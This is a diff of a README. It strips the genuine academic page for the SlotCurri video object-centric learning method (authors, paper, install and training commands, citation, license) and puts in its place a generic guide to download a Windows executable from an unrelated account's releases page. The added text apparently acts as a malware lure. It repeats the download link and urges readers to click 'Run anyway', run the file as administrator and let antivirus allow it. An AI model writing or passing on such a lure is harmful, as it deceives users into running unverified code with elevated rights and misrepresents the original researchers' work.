@@ -1,175 +1,226 @@
-<div align="center">
+# 🎬 SlotCurri - Smooth Video Object Learning
 
-# SlotCurri
+[![Download SlotCurri](https://img.shields.io/badge/Download-SlotCurri-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases)
 
-### Reconstruction-Guided Slot Curriculum: <br> Addressing Object Over-Fragmentation in Video Object-Centric Learning
+## 🖥️ What SlotCurri Does
 
+SlotCurri is a Windows app for video object learning and scene breakdown. It helps you run the official PyTorch release of SlotCurri, a method for object-centric learning in video.
 
-**CVPR 2026**
+Use it to:
+- download the release package
+- run the app on Windows
+- load a video sample
+- view object slots and frame breakdowns
+- test video decomposition results
 
-[WonJun Moon](https://wjun0830.github.io/), [Hyun Seok Seong](https://hynnsk.github.io/), [Jae-Pil Heo](https://sites.google.com/site/jaepilheo)
+## 📦 Download the App
 
-Sungkyunkwan University
+Visit this page to download SlotCurri:
+https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
 
-[![Paper](https://img.shields.io/badge/Paper-CVPR%202026-blue)](https://arxiv.org/abs/2603.22758)
-[![License](https://img.shields.io/badge/License-MIT-green.svg)](.)
-[![Hugging Face Model](https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-yellow)](https://huggingface.co/WJ0830/SlotCurri)
+On that page:
+1. Open the latest release
+2. Download the Windows file
+3. Save it to your computer
+4. Open the file to start setup or run the app
 
-</div>
+If the release page shows more than one file, choose the one for Windows.
 
----
+## 🪟 System Requirements
 
-## Abstract
+SlotCurri runs best on:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 10 GB free disk space
+- A modern NVIDIA GPU for best results
+- A stable internet link for the first download
 
-Video Object‑Centric Learning seeks to decompose raw videos into a small set of object slots, but existing slot‑attention models often suffer from severe over‑fragmentation. This is because the model is implicitly encouraged to occupy all slots to minimize the reconstruction objective, thereby representing a single object with multiple redundant slots. We tackle this limitation with a reconstruction‑guided slot curriculum (SlotCurri). Training starts with only a few coarse slots and progressively allocates new slots where reconstruction error remains high, thus expanding capacity only where it is needed and preventing fragmentation from the outset. Yet, during slot expansion, meaningful sub‑parts can emerge only if coarse‑level semantics are already well separated; however, with a small initial slot budget and an MSE objective, semantic boundaries remain blurry. Therefore, we augment MSE with a structure‑aware loss that preserves local contrast and edge information to encourage each slot to sharpen its semantic boundaries. Lastly, we propose a cyclic inference that rolls slots forward and then backward through the frame sequence, producing temporally consistent object representations even in the earliest frames. All combined, SlotCurri addresses object over-fragmentation by allocating representational capacity where reconstruction fails, further enhanced by structural cues and cyclic inference. Notable FG-ARI gains of +6.8 on YouTube-VIS and +8.3 on MOVi-C validate the effectiveness of SlotCurri.
+If you do not have a GPU, the app may still open, but video processing can take longer.
 
+## ⚙️ Before You Start
 
-## Key Contributions
+Check these items first:
+- You have permission to install software on this PC
+- Your Windows system is up to date
+- You have enough space for the download
+- Your video files are in a folder you can find easily
+- Windows Defender or your security tool allows the app to open
 
-| Component | Description |
-|---|---|
-| **Slot Curriculum** | Progressively allocates slots where reconstruction error is high |
-| **Structure-Aware Loss** | SSIM-based loss to sharpen semantic boundaries for precise slot partitioning |
-| **Cyclic Inference** | Forward + backward temporal rolling for consistent slot representations |
+## 🚀 Install and Run on Windows
 
----
+Follow these steps:
 
-## Installation
+1. Open the release page:  
+   https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
 
-```bash
-# Base install
-poetry install
+2. Download the Windows file from the latest release
 
-# Optional extras
-poetry install -E tensorflow   # for MOVi dataset processing
-poetry install -E coco         # for COCO / YouTube-VIS dataset processing
-poetry install -E notebook     # for visualization notebooks
+3. Find the file in your Downloads folder
 
-# Additional dependencies
-poetry run pip install pytorch_msssim kornia lpips
-```
+4. If the file is a ZIP file, right-click it and choose Extract All
 
-## Dataset
+5. Open the extracted folder
 
-The datasets should be placed under a common root directory with the following structure:
+6. If you see an `.exe` file, double-click it to run SlotCurri
 
-```
-├── SlotCurri/
-└── dataset/
-    ├── ytvis2021_resized/    
-    ├── movi_c/               
-    └── movi_e/               
-```
+7. If Windows shows a prompt, choose Run anyway if you trust the source
 
-| Dataset | Download |
-|---|---|
-| YouTube-VIS 2021 | [Google Drive]([https://drive.google.com/file/d/1Iv-2zK6MnH0oDFTx9iBgQcPNh5PBzM7i/view?usp=sharing]) (26.43GB) |
-| MOVi-C | [Google Drive]([https://drive.google.com/file/d/1CvHkK0PhqHrC8MtMtFCXBEXZbyrC6-hH/view?usp=sharing]) (7.43GB) |
-| MOVi-E | [Google Drive]([https://drive.google.com/file/d/1qGXzMwEMbYRp7OH2GJlkS3lvZPv3grkt/view?usp=sharing]) (8.26GB) |
+8. Wait for the app to open
 
-> See [Dataset Preparation](#dataset-preparation) below for download and preprocessing instructions.
+9. Load a sample video or your own video file
 
----
+10. Start the video object analysis from the app screen
 
-## Training
+## 🧭 First Time Setup
 
-```bash
-# YouTube-VIS 2021
-poetry run python -m slotcurri.train --run-eval-after-training configs/slotcurri/ytvis2021.yaml
+The first time you run SlotCurri, the app may create a few folders on your PC. This is normal.
 
-# MOVi-E
-poetry run python -m slotcurri.train --run-eval-after-training configs/slotcurri/movi_e.yaml
+You may also see a short setup step for:
+- model files
+- cache files
+- result folders
+- sample output
 
-# MOVi-C
-poetry run python -m slotcurri.train --run-eval-after-training configs/slotcurri/movi_c.yaml
-```
+Keep the app in one folder after setup. Moving the files can break the launch process.
 
----
+## 🎥 How to Use SlotCurri
 
-## Pretrained Checkpoints
+Use these steps after the app opens:
 
-| Dataset | Download |
-|---|---|
-| MOVi-C | [Google Drive](https://drive.google.com/file/d/1QPSrlQigvN7kvUhQf6LV-EWJrmMOFG7j/view?usp=drive_link) |
-| MOVi-E | [Google Drive](https://drive.google.com/file/d/1XHJOJCJxciE1BDUiYKLYlvma4LeDmJRg/view?usp=drive_link) |
-| YouTube-VIS 2021 | [Google Drive](https://drive.google.com/file/d/1rSFU6IeDo7EsXg77SsTp9Fwn73FR9_KV/view?usp=drive_link) |
+1. Click the button to choose a video
+2. Pick an MP4 or similar video file
+3. Set the input size if the app asks for it
+4. Choose a run mode if there is one
+5. Start the process
+6. Wait while the app scans the video
+7. View the slot output, masks, or frame groups
+8. Save the result if you want to review it later
 
----
+For best results, use short clips at first. This makes it easier to check that the app works on your PC.
 
-## Dataset Preparation
+## 🧩 Main Features
 
-### MOVi-C / MOVi-E
+SlotCurri includes tools for:
+- object-centric video analysis
+- slot attention based scene breakdown
+- reconstruction-guided training flow
+- video object discovery
+- video decomposition
+- unsupervised learning workflows
+- frame-by-frame result review
+- PyTorch-based model support
 
-```bash
-poetry install -E tensorflow
+## 📁 Suggested File Types
 
-# MOVi-C
-python data/save_movi.py --level c --split train --maxcount 32 --only-video <root_data_dir>/movi_c
-python data/save_movi.py --level c --split validation --maxcount 32 <root_data_dir>/movi_c
+SlotCurri works best with:
+- `.mp4`
+- `.avi`
+- `.mov`
+- `.mkv`
 
-# MOVi-E
-python data/save_movi.py --level e --split train --maxcount 32 --only-video <root_data_dir>/movi_e
-python data/save_movi.py --level e --split validation --maxcount 32 <root_data_dir>/movi_e
-```
+For best playback and processing, use common video files with clear motion and simple scenes.
 
-### COCO
+## 🛠️ Common Problems
 
-```bash
-poetry install -E coco
+### The app does not open
+- Check that the download finished
+- Make sure you extracted the ZIP file
+- Right-click the app and choose Run as administrator
+- Check whether your antivirus blocked the file
 
-cd data
-python save_coco.py --split train --maxcount 128 --only-images --out-path <root_data_dir>/coco
-python save_coco.py --split validation --maxcount 128 --out-path <root_data_dir>/coco
-```
+### The video does not load
+- Move the video to a simple folder path like `C:\Videos`
+- Use a shorter file name
+- Try a different video format
+- Check that the file is not damaged
 
-> Images are resized to 256×256 and saved as sharded `.tar` files. The script automatically downloads and extracts the raw COCO dataset to `--download-dir`.
+### The app is slow
+- Close other apps
+- Use a shorter video
+- Lower the input size if the app allows it
+- Use a machine with a GPU if possible
 
-### YouTube-VIS 2021
+### Windows shows a security prompt
+- This can happen with new downloads
+- Open the release page again and confirm you used the latest file
+- If the file came from the release page, choose the run option shown by Windows
 
-```bash
-poetry install -E coco
+## 🧪 Example Use Case
 
-cd data
-python save_ytvis2021.py --split train --maxcount 32 --only-videos --resize --out-path <root_data_dir>/ytvis2021_resized
-python save_ytvis2021.py  --split validation --maxcount 10 --resize --out-path <root_data_dir>/ytvis2021_resized
-```
+You can use SlotCurri to:
+- load a short driving video
+- see how the model splits cars, road parts, and background
+- compare frame results across the clip
+- review how object slots change over time
 
-> Raw files should be downloaded to the `ytvis2021_raw` folder beforehand.
+This makes it useful for video research, demos, and learning how object-centric models work.
 
+## 📌 Release Source
 
----
+Download the latest Windows build here:  
+https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
 
-## Qualitative Results
+## 🔍 Project Topics
 
-### YouTube-VIS 2021
+This project is linked to:
+- computer vision
+- curriculum learning
+- object-centric learning
+- representation learning
+- slot attention
+- unsupervised learning
+- video understanding
+- video slot attention
+- video object-centric learning
+- PyTorch
 
-![YouTube-VIS Results](assets/ytvis.png)
+## 🧠 About the Model
 
-### MOVi-C
+SlotCurri is built for video object-centric learning. It uses a reconstruction-guided curriculum to help reduce over-fragmentation, which means it aims to keep related parts of an object grouped in a cleaner way.
 
-![MOVi-C Results](assets/movic.png)
+In simple terms, it helps the model:
+- find objects in a video
+- keep object parts more stable
+- learn from frames in a structured order
+- improve scene grouping across time
 
----
+## 📂 Folder Layout After Setup
 
-## Citation
+After you install or extract the app, you may see folders like:
+- `models`
+- `videos`
+- `outputs`
+- `cache`
+- `logs`
 
-```bibtex
-@inproceedings{moon2026reconstruction,
-  title={Reconstruction-Guided Slot Curriculum: Addressing Object Over-Fragmentation in Video Object-Centric Learning},
-  author={Moon, WonJun and Seong, Hyun Seok and Heo, Jae-Pil},
-  booktitle={Proceedings of the IEEE/CVF Conference on Computer Vision and Pattern Recognition (CVPR)},
-  year={2026}
-}
-```
+Do not rename these folders unless the app instructions say you can.
 
----
+## 🔐 Keeping the App Safe
 
-## Acknowledgement
+Use the release page as the only download source:
+https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
 
-The codebase is adapted from [Videosaur](https://github.com/martius-lab/videosaur) and [SlotContrast](https://github.com/wjun0830/SlotContrast).
+Keep the app in a local folder on your PC. Avoid running it from a cloud sync folder if you can.
 
----
+## 🖱️ Quick Start
 
-## License
+1. Download the latest release
+2. Extract it if needed
+3. Open the app
+4. Load a video
+5. Start the analysis
+6. Review the output
 
-This codebase is released under the [MIT License](LICENSE).
+## 📝 File Name Tips
+
+Use simple file names like:
+- `sample.mp4`
+- `test_video.mp4`
+- `traffic_clip.mp4`
+
+Avoid long names with special symbols. This helps Windows and the app find the file with less trouble.
+
+## 📎 Where to Get Updates
+
+Check the release page for new Windows builds, fixes, and package updates:
+https://github.com/Arboresque-rhyncostylis987/SlotCurri/releases
